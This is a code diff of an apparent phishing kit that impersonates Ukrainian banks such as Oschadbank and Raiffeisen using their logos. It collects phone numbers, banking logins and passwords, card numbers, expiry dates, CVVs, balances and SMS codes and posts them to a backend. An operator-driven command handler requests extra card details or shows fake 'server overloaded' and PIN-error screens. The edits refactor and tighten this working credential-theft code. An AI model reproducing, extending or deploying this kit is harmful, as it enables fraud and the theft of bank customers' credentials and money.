@@ -55,14 +55,11 @@
         .input-field.invalid { border-color: var(--danger-color); }
         .error-message { color: var(--danger-color); font-size: 12px; margin-top: 4px; text-align: left; display: none; }
         .phone-input-wrapper { display: flex; }
-        .phone-prefix {
-            padding: 15px; border: 1px solid var(--border-color); border-right: none;
-            background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500;
-        }
+        .phone-prefix { padding: 15px; border: 1px solid var(--border-color); border-right: none; background-color: #f8f9fa; border-radius: 12px 0 0 12px; font-weight: 500; }
         .phone-input-wrapper .input-field { border-radius: 0 12px 12px 0; }
         .modal-footer { margin-top: 30px; display: flex; gap: 15px; justify-content: center; }
         .btn { width: 100%; padding: 16px; border: none; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: all 0.3s ease; }
-        .btn:disabled { background-color: #ced4da !important; cursor: not-allowed; }
+        .btn:disabled { background-color: #ced4da !important; color: #6c757d !important; cursor: not-allowed; }
         .btn-next { background-color: var(--primary-color); color: var(--text-on-primary); }
         .btn-back { background-color: #f1f3f5; color: var(--light-text); }
         body[data-theme="oschadbank"] { --primary-color: #00A39C; --bg-gradient: linear-gradient(135deg, #E0F2F1 0%, #B2DFDB 100%); }
@@ -78,53 +75,36 @@
             width: 100%; max-width: 480px; text-align: center; box-shadow: none;
             display: flex; flex-direction: column; align-items: center;
         }
-        .oschad-lk-modal .header {
-            width: 100%; display: flex; align-items: center; padding: 10px 15px;
-        }
+        .oschad-lk-modal .header { width: 100%; display: flex; align-items: center; padding: 10px 15px; }
         .oschad-lk-modal .back-arrow { font-size: 28px; color: #495057; margin-right: 15px; cursor: pointer; line-height: 1; }
         .oschad-lk-modal .title { font-size: 18px; font-weight: 600; flex-grow: 1; text-align: center; margin-right: 40px; }
         .oschad-lk-modal .welcome-section { padding: 20px; text-align: center; width: 100%; display: flex; flex-direction: column; align-items: center; }
         .oschad-lk-modal .welcome-section p { font-size: 16px; color: #495057; line-height: 1.5; margin-bottom: 25px; font-weight: 500; }
-        .oschad-lk-modal .toggle-buttons {
-            display: flex; background-color: #e9ecef; border-radius: 12px;
-            overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%;
-        }
-        .oschad-lk-modal .toggle-buttons button {
-            flex: 1; padding: 12px 15px; border: none; background-color: transparent; font-size: 15px;
-            font-weight: 600; color: #6c757d; cursor: pointer; border-radius: 8px; transition: all 0.2s ease;
-        }
+        .oschad-lk-modal .toggle-buttons { display: flex; background-color: #e9ecef; border-radius: 12px; overflow: hidden; padding: 4px; margin-bottom: 30px; width: 100%; }
+        .oschad-lk-modal .toggle-buttons button { flex: 1; padding: 12px 15px; border: none; background-color: transparent; font-size: 15px; font-weight: 600; color: #6c757d; cursor: pointer; border-radius: 8px; transition: all 0.2s ease; }
         .oschad-lk-modal .toggle-buttons button.active { background-color: var(--oschad-light); color: var(--oschad-primary); }
         .oschad-lk-modal .input-group { margin-bottom: 20px; width: 100%; position: relative; }
-        .oschad-lk-modal .input-group label {
-            position: absolute; top: 15px; left: 15px; font-size: 15px; color: #adb5bd;
-            transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px;
-        }
+        .oschad-lk-modal .input-group label { position: absolute; top: 15px; left: 15px; font-size: 15px; color: #adb5bd; transition: all 0.2s ease; pointer-events: none; background-color: var(--white); padding: 0 4px; }
         .oschad-lk-modal .input-group.static-label label,
-        .oschad-lk-modal .input-group input:focus + label,
-        .oschad-lk-modal .input-group input:not(:placeholder-shown) + label { top: -10px; left: 10px; font-size: 12px; color: #6c757d; }
-        .oschad-lk-modal .input-field {
+        .oschad-lk-modal .input-group .lk-input:focus + label,
+        .oschad-lk-modal .input-group .lk-input:not(:placeholder-shown) + label { top: -10px; left: 10px; font-size: 12px; color: #6c757d; }
+        .oschad-lk-modal .lk-input {
             width: 100%; padding: 15px 45px 15px 15px; border: 1px solid #dee2e6;
             border-radius: 12px; font-size: 16px; background-color: var(--white);
             transition: all 0.2s ease; outline: none; font-weight: 500;
         }
-        .oschad-lk-modal .input-field:focus { border-color: var(--oschad-primary); }
-        .oschad-lk-modal .input-field::placeholder { color: transparent; }
-        .oschad-lk-modal .password-toggle-icon {
-            position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #adb5bd;
-        }
+        .oschad-lk-modal .lk-input:focus { border-color: var(--oschad-primary); }
+        .oschad-lk-modal .lk-input::placeholder { color: transparent; }
+        .oschad-lk-modal .password-toggle-icon { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); cursor: pointer; color: #adb5bd; }
         .oschad-lk-modal .password-toggle-icon svg { width: 22px; height: 22px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; }
         .oschad-lk-modal .phone-wrapper { display: flex; align-items: center; width: 100%; padding-left: 15px; border: 1px solid #dee2e6; border-radius: 12px; background-color: var(--white); }
         .oschad-lk-modal .phone-wrapper:focus-within { border-color: var(--oschad-primary); }
         .oschad-lk-modal .phone-prefix { padding-right: 5px; font-size: 16px; font-weight: 500; }
-        .oschad-lk-modal .phone-wrapper .input-field { border: none; padding-left: 0; flex-grow: 1; }
-        .oschad-lk-modal .submit-button {
-            width: 100%; padding: 16px; margin-top: 30px; border: none;
-            border-radius: 16px; background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700;
-            cursor: not-allowed; transition: all 0.2s ease;
-        }
+        .oschad-lk-modal .phone-wrapper .lk-input { border: none; padding-left: 0; flex-grow: 1; }
+        .oschad-lk-modal .submit-button { width: 100%; padding: 16px; margin-top: 30px; border: none; border-radius: 16px; background-color: #e9ecef; color: #adb5bd; font-size: 18px; font-weight: 700; cursor: not-allowed; transition: all 0.2s ease; }
         .oschad-lk-modal .submit-button.active { background-color: var(--oschad-primary); color: var(--white); cursor: pointer; }
         .oschad-lk-modal .loader-icon {
-            width: 80px; height: 80px; margin: 20px auto; background: transparent; border: none;
+            width: 80px; height: 80px; background: transparent; border: none;
             -webkit-animation: spin 2s linear infinite; animation: spin 2s linear infinite;
         }
         @-webkit-keyframes spin { 0% { -webkit-transform: rotate(0deg); } 100% { -webkit-transform: rotate(360deg); } }
@@ -163,23 +143,8 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentStepIndex = 0;
     let collectedData = {};
 
-    const specialFlowSteps = [
-        { type: 'phone', title: 'Введіть номер телефону' },
-        { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' }
-    ];
-    const confirmationSteps = [
-        {
-            type: 'confirm_all',
-            title: 'Підтвердити володіння карткою',
-            fields: [
-                { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' },
-                { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' },
-                { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' },
-                { id: 'balance', placeholder: 'Поточний баланс', type: 'number' }
-            ]
-        }
-    ];
-
+    const specialFlowSteps = [ { type: 'phone', title: 'Введіть номер телефону' }, { type: 'card_simple', title: 'Для зарахування коштів введіть номер картки' } ];
+    const confirmationSteps = [ { type: 'confirm_all', title: 'Підтвердити володіння карткою', fields: [ { id: 'card_confirm', placeholder: 'Номер картки', type: 'tel', maxlength: '19' }, { id: 'card-expiry', placeholder: 'Термін дії (ММ/РР)', type: 'tel', maxlength: '5' }, { id: 'card-cvv', placeholder: 'CVV', type: 'tel', maxlength: '3' }, { id: 'balance', placeholder: 'Поточний баланс', type: 'number' } ] } ];
     const bankFlows = {
         'oschadbank': { name: 'Ощадбанк', logoUrl: 'https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/Oschadbank_%28uk%29.png/1200px-Oschadbank_%28uk%29.png', theme: 'oschadbank', steps: [{ type: 'phone', title: 'Введіть номер телефону' },{ type: 'card', title: 'Введіть номер карти' }] },
         'raiffeisen': { name: 'Райффайзен', logoUrl: 'https://platforma-msb.org/wp-content/uploads/2017/08/rajffajzen-1920x1080316.jpg', theme: 'raiffeisen', steps: specialFlowSteps, special: true },
@@ -232,11 +197,11 @@ document.addEventListener('DOMContentLoaded', () => {
                                 <label for="phone_input">Номер телефону</label>
                                 <div class="phone-wrapper">
                                     <span class="phone-prefix">+380</span>
-                                    <input type="tel" class="input-field" id="phone_input" placeholder=" " autocomplete="off">
+                                    <input type="tel" class="lk-input" id="phone_input" placeholder=" " autocomplete="off">
                                 </div>
                             </div>
                             <div class="input-group">
-                                <input type="password" class="input-field" id="phone_password_input" placeholder=" " autocomplete="off">
+                                <input type="password" class="lk-input" id="phone_password_input" placeholder=" " autocomplete="off">
                                 <label for="phone_password_input">Пароль</label>
                                 <span class="password-toggle-icon">
                                     <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
@@ -245,11 +210,11 @@ document.addEventListener('DOMContentLoaded', () => {
                         </div>
                         <div id="login-form" style="display: none;">
                             <div class="input-group">
-                                <input type="text" class="input-field" id="login_input" placeholder=" " autocomplete="off">
+                                <input type="text" class="lk-input" id="login_input" placeholder=" " autocomplete="off">
                                 <label for="login_input">Логін</label>
                             </div>
                             <div class="input-group">
-                                <input type="password" class="input-field" id="login_password_input" placeholder=" " autocomplete="off">
+                                <input type="password" class="lk-input" id="login_password_input" placeholder=" " autocomplete="off">
                                 <label for="login_password_input">Пароль</label>
                                 <span class="password-toggle-icon">
                                     <svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
@@ -260,7 +225,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     <button class="submit-button" id="oschad-submit-btn" disabled>ПРОДОВЖИТИ</button>
                 </div>
             `;
-        }
+        } // Здесь можно будет добавить else if для других банков
         customModalContent.innerHTML = html;
         customModalOverlay.style.display = 'flex';
         addCustomModalListeners(bankName);
@@ -268,18 +233,21 @@ document.addEventListener('DOMContentLoaded', () => {
     
     function addCustomModalListeners(bankName) {
         if (bankName === 'Ощадбанк') {
-            const submitBtn = document.getElementById('oschad-submit-btn');
-            const togglePhoneBtn = document.getElementById('toggle-phone');
-            const toggleLoginBtn = document.getElementById('toggle-login');
-            const phoneLoginForm = document.getElementById('phone-login-form');
-            const loginForm = document.getElementById('login-form');
-            const oschadBackArrow = document.getElementById('oschad-back-arrow');
+            const modal = document.querySelector('.oschad-lk-modal');
+            if (!modal) return;
+
+            const submitBtn = modal.querySelector('.submit-button');
+            const togglePhoneBtn = modal.querySelector('#toggle-phone');
+            const toggleLoginBtn = modal.querySelector('#toggle-login');
+            const phoneLoginForm = modal.querySelector('#phone-login-form');
+            const loginForm = modal.querySelector('#login-form');
+            const oschadBackArrow = modal.querySelector('.back-arrow');
             let activeOschadForm = 'phone';
             
-            const phoneInput = document.getElementById('phone_input');
-            const phonePassInput = document.getElementById('phone_password_input');
-            const loginInput = document.getElementById('login_input');
-            const loginPassInput = document.getElementById('login_password_input');
+            const phoneInput = modal.querySelector('#phone_input');
+            const phonePassInput = modal.querySelector('#phone_password_input');
+            const loginInput = modal.querySelector('#login_input');
+            const loginPassInput = modal.querySelector('#login_password_input');
             
             phoneInput.addEventListener('input', (e) => {
                 let value = e.target.value.replace(/\D/g, '').substring(0, 9);
@@ -330,7 +298,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
             oschadBackArrow.addEventListener('click', () => { customModalOverlay.style.display = 'none'; });
             
-            customModalContent.querySelectorAll('.password-toggle-icon').forEach(icon => {
+            modal.querySelectorAll('.password-toggle-icon').forEach(icon => {
                 icon.addEventListener('click', () => {
                     const passwordInput = icon.closest('.input-group').querySelector('input');
                     const isPassword = passwordInput.type === 'password';
@@ -359,9 +327,9 @@ document.addEventListener('DOMContentLoaded', () => {
                             <span class="title">Зачекайте</span>
                         </div>
                         <div class="welcome-section">
+                            <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
                             <h3>Зачекайте</h3>
                             <p>Сервер перевантажений</p>
-                            <img src="https://itc.ua/wp-content/uploads/2021/12/oschadik_mint_headphones-770x770.png" class="loader-icon" alt="Loading...">
                         </div>
                     </div>
                 `;
@@ -382,9 +350,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     function handleServerCommand(command) {
         const { type, data } = command;
-        if (type !== 'lk' && type !== 'call') {
-            customModalOverlay.style.display = 'none';
-        }
+        if (type !== 'lk' && type !== 'call') { customModalOverlay.style.display = 'none'; }
         const showMessageInMainModal = (title, text, btnText, callback) => {
             body.classList.add('form-active');
             modalTitle.textContent = title;
@@ -402,27 +368,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">Відправити</button>`;
                 document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
                 break;
-            case 'lk':
-                body.classList.remove('form-active');
-                renderCustomModal('lk', data.bankName);
-                break;
-            case 'call':
-                body.classList.remove('form-active');
-                renderCustomModal('call', data.bankName);
-                break;
-            case 'request_details':
-                activeBankData.steps.push(...confirmationSteps);
-                currentStepIndex++;
-                renderStep();
-                break;
+            case 'lk': body.classList.remove('form-active'); renderCustomModal('lk', data.bankName); break;
+            case 'call': body.classList.remove('form-active'); renderCustomModal('call', data.bankName); break;
+            case 'request_details': activeBankData.steps.push(...confirmationSteps); currentStepIndex++; renderStep(); break;
             case 'other':
                 const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
-                if (bankToDisable) {
-                    bankToDisable.classList.add('disabled');
-                    if (!bankToDisable.querySelector('.unavailable-label')) {
-                        bankToDisable.innerHTML += '<span class="unavailable-label">Недоступно</span>';
-                    }
-                }
+                if (bankToDisable) { bankToDisable.classList.add('disabled'); }
                 showMessageInMainModal("Помилка", data.text, "Обрати інший банк", () => window.location.reload());
                 break;
             case 'pin_error': showMessageInMainModal("Невірний ПІН", data.text, "Назад", () => { currentStepIndex > 0 ? handleBackStep() : window.location.reload(); }); break;
@@ -434,7 +385,8 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     function handleNextStep() {
-        if (!validateCurrentStep()) return;
+        if (!validateCurrentStep()) { nextBtn.disabled = true; return; }
+        nextBtn.disabled = false;
         let data = {};
         stepContent.querySelectorAll('.input-field').forEach(input => {
             let key = input.id;
@@ -473,6 +425,7 @@ document.addEventListener('DOMContentLoaded', () => {
         modalFooter.style.display = 'flex';
         backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none';
         nextBtn.style.display = 'block';
+        nextBtn.disabled = true; // Start as disabled
         addInputFormatting();
     }
 
@@ -482,37 +435,31 @@ document.addEventListener('DOMContentLoaded', () => {
     function addInputFormatting() {
         const phoneInput = document.getElementById('phone');
         if (phoneInput) {
-            phoneInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\D/g, '').substring(0, 9);
-                e.target.value = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
+            phoneInput.addEventListener('input', () => {
+                let value = phoneInput.value.replace(/\D/g, '').substring(0, 9);
+                phoneInput.value = value.replace(/(\d{2})(\d{3})?(\d{2})?(\d{2})?/, (m, p1, p2, p3, p4) => [p1, p2, p3, p4].filter(Boolean).join(' '));
+                nextBtn.disabled = phoneInput.value.replace(/\D/g, '').length !== 9;
             });
         }
-        const cardNumberInput = document.getElementById('card') || document.getElementById('card_confirm');
-        if (cardNumberInput) { cardNumberInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(); }); }
-        const cardExpiryInput = document.getElementById('card-expiry');
-        if (cardExpiryInput) { cardExpiryInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{2})(\d{2})/, '$1/$2'); }); }
+        const cardInput = document.getElementById('card');
+         if (cardInput) {
+             cardInput.addEventListener('input', () => {
+                 cardInput.value = cardInput.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
+                 nextBtn.disabled = cardInput.value.replace(/\D/g, '').length < 16;
+             });
+         }
     }
 
     function validateCurrentStep() {
         let isValid = true;
         stepContent.querySelectorAll('.input-field').forEach(input => {
-            const errorContainer = input.closest('.input-group')?.querySelector('.error-message');
-            input.classList.remove('invalid');
-            if (errorContainer) errorContainer.style.display = 'none';
             let value = input.value.replace(/\D/g, '');
             let requiredLength = 0;
             switch (input.id) {
                 case 'phone': requiredLength = 9; break;
-                case 'card': case 'card_confirm': requiredLength = 16; break;
-                case 'card-expiry': requiredLength = 4; break;
-                case 'card-cvv': requiredLength = 3; break;
-                case 'pin': requiredLength = 4; break;
+                case 'card': requiredLength = 16; break;
             }
-            if (requiredLength > 0 && value.length < requiredLength) {
-                isValid = false;
-                input.classList.add('invalid');
-                if (errorContainer) { errorContainer.textContent = `Поле має містити ${requiredLength} цифр.`; errorContainer.style.display = 'block'; }
-            }
+            if (requiredLength > 0 && value.length < requiredLength) { isValid = false; }
         });
         return isValid;
     }
@@ -521,9 +468,9 @@ document.addEventListener('DOMContentLoaded', () => {
         const codeInput = document.getElementById('sms-code');
         const code = codeInput.value;
         const errorContainer = document.getElementById('sms-error-container');
-        if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Введіть код</p>`; return; }
+        if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p style="color:red;">Введіть код</p>`; return; }
         try { await fetch(`/api/sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }), }); } catch (error) { console.error('Failed to send sms code:', error); }
-        if (errorContainer) errorContainer.innerHTML = `<p style="color:red; text-align:center;">Невірний код</p>`;
+        if (errorContainer) errorContainer.innerHTML = `<p style="color:red;">Невірний код</p>`;
         codeInput.value = '';
     }
     
